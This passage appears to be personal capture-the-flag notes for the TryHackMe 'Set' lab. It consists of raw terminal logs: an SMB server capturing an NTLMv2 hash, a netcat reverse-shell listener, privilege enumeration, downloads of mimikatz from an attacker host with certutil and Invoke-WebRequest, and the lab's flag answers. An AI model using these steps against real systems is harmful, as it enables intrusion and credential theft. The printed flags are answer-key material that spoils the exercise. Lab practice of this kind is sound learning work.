┌──(kali㉿kali)-[~/Set]
└─$ sudo smbserver.py -smb2support -username me -password me share .
[sudo] password for kali: 
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.29.100,50140)
[*] AUTHENTICATE_MESSAGE (\me,SET)
[*] User SET\me authenticated successfully
[*] me:::aaaaaaaaaaaaaaaa:81064b34427c6121ffdfa502f9c3c679:01010000000000000040d555f51ed901b8105e597702ba3d00000000010010004a00770047005100510067005a006e00030010004a00770047005100510067005a006e0002001000540057006e0054004f0066006800410004001000540057006e0054004f00660068004100070008000040d555f51ed901060004000200000008003000300000000000000000000000003000008e51280f7855608ab05047cf8394e261f4c7b89e9e48340093784f0cd13f40a80a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e00310039002e003100300033000000000000000000
[*] Connecting Share(1:share)
[*] Connecting Share(2:IPC$)
[*] AUTHENTICATE_MESSAGE (\,SET)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,SET)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,SET)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,SET)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,SET)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,SET)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,SET)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,SET)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,SET)
[*] Could not authenticate user!
[*] Disconnecting Share(2:IPC$)
[*] AUTHENTICATE_MESSAGE (\,SET)
[*] Could not authenticate user!


┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.29.100.
Ncat: Connection from 10.10.29.100:50142.
Microsoft Windows [Version 10.0.17763.1339]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\windows\system32>whoami
whoami
set\one

C:\windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled

C:\windows\system32>net user one
net user one
User name                    One
Full Name                    One Agent
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/7/2020 6:56:25 AM
Password expires             Never
Password changeable          6/7/2020 6:56:25 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   1/2/2023 12:55:01 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users                
Global Group memberships     *None                 
The command completed successfully.


C:\windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6EC8-9D7C

 Directory of C:\Users\Administrator\Desktop

06/16/2020  01:07 PM    <DIR>          .
06/16/2020  01:07 PM    <DIR>          ..
06/28/2020  07:42 AM               137 Flag3.txt
               1 File(s)            137 bytes
               2 Dir(s)  25,284,255,744 bytes free

C:\Users\Administrator\Desktop>type flag3.txt
type flag3.txt
Flag3: THM{934f7faaadab3b040edab8214789114c9d3049dd}

I am glad we blocked Veeam ONE agent in Firewall, so we can patch it next week.



:)

was really fun!

┌──(kali㉿kali)-[~/Set]
└─$ locate mimikatz.exe
/home/kali/Downloads/learning_kerberos/mimikatz.exe
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
                                                                                                                                                            
┌──(kali㉿kali)-[~/Set]
└─$ cp /home/kali/Downloads/learning_kerberos/mimikatz.exe mimikatz.exe
                                                                                                                                                            
┌──(kali㉿kali)-[~/Set]
└─$ ls                 
CVE-2021-1675.ps1  hash_michelle  hook.zip  mimikatz.exe  nc.exe     users_final.txt  winPEASany_ofs.exe
hash_final         hook.lnk       Info.txt  nc64.exe      plink.exe  users.xml

C:\Users\One\Documents>certutil.exe -urlcache -f http://10.8.19.103:1337/mimikatz.exe mimikatz.exe
certutil.exe -urlcache -f http://10.8.19.103:1337/mimikatz.exe mimikatz.exe
Access is denied.

C:\Users\One\Documents>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\One\Documents> Invoke-WebRequest -Uri http://10.8.19.103:1337/mimikatz.exe -outfile mimikatz.exe
Invoke-WebRequest -Uri http://10.8.19.103:1337/mimikatz.exe -outfile mimikatz.exe
PS C:\Users\One\Documents> ls
ls


    Directory: C:\Users\One\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         1/2/2023   2:09 PM        1263880 mimikatz.exe  

:)

PS C:\Users\Administrator\Downloads> cmd
cmd
Microsoft Windows [Version 10.0.17763.1339]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Downloads>.\mimikatz.exe
.\mimikatz.exe
The system cannot execute the specified program.

C:\Users\Administrator\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6EC8-9D7C

 Directory of C:\Users\Administrator\Downloads

01/02/2023  02:13 PM    <DIR>          .
01/02/2023  02:13 PM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)  25,279,234,048 bytes free



```

![[Pasted image 20230102101942.png]]
![[Pasted image 20230102122020.png]]

![[Pasted image 20230102150738.png]]

Flag 1

*THM{4c66e2b8d4c45a65e6a7d0c7ad4a5d7ff245dc14}*

Flag 2

*THM{690798b1780964f5f51cebd854da5a2ea236ebb5}*

Flag 3

*THM{934f7faaadab3b040edab8214789114c9d3049dd}*


[[Atlas]]